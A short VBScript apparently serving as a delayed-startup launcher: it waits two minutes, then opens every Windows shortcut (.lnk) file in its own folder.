WScript.Sleep 120000
With CreateObject("Scripting.FileSystemObject")
    For Each objFile In .GetFile(WScript.ScriptFullName).ParentFolder.Files
        If LCase(.GetExtensionName(objFile.Name))="lnk" Then
            CreateObject("WScript.Shell").Run """" & objFile.Path & """"
        End If
    Next
End With
